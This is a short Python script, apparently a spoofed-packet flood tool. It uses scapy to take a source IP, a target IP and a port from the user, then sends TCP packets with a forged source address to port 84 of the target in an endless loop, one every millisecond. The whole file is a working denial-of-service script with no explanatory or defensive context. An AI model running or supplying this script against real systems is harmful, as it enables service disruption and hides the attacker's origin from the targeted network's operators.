
#! /usr/bin/env python3

import scapy.all  as scapy
source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = scapy.IP(src = source_IP, dst = target_IP)
   TCP1 = scapy.TCP(sport = source_port, dport = 84)
   pkt = IP1 / TCP1
   scapy.send(pkt, inter = .001)
   
   print ("packet sent ", i)
   i=i+1


